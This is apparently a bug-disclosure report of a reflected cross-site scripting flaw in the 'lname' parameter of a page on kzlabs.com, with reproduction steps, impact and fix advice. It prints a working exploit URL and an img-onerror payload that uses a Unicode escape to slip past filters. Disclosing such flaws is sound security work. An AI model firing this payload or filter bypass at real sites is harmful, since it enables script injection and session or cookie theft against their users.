# Reflected Cross-Site Scripting (XSS) via `lname` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `lname` parameter of the application. User-controlled input is reflected into the HTML response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

The vulnerability can be exploited using an `<img>` tag with an `onerror` event handler and Unicode escape sequence bypass.

---

## Vulnerable Endpoint

```text id="v7m2qa"
http://kzlabs.com/8.php?fname=aaaa&lname=xicorr%22%3E%3CiMg+src%3Dx+onerror%3Dconfi%5Cu0072m%3F.%281%29%3E
```

---

## Vulnerable Parameter

```text id="r4x8zn"
lname
```

---

## Payload Used

```html id="k9c1wp"
xicorr"><iMg src=x onerror=confi\u0072m?.(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/8.php?fname=aaaa&lname=xicorr%22%3E%3CiMg+src%3Dx+onerror%3Dconfi%5Cu0072m%3F.%281%29%3E
   ```

2. Observe that the payload is reflected into the page without proper sanitization.

3. The injected `<img>` element triggers the `onerror` event.

4. JavaScript executes successfully and displays a popup dialog.

---

## Proof of Concept

```text id="p5n7md"
http://kzlabs.com/8.php?fname=aaaa&lname=xicorr%22%3E%3CiMg+src%3Dx+onerror%3Dconfi%5Cu0072m%3F.%281%29%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/fdadbd02-558c-4b7a-a2eb-56fb3512408c" />


---

## Impact

* Session hijacking
* Cookie theft
* Arbitrary JavaScript execution

---

## Recommendations for Fix

* Encode output before rendering
* Validate and sanitize user-controlled input
* Implement context-aware escaping
* Avoid rendering raw user input directly into HTML
* Deploy a strict Content Security Policy (CSP)
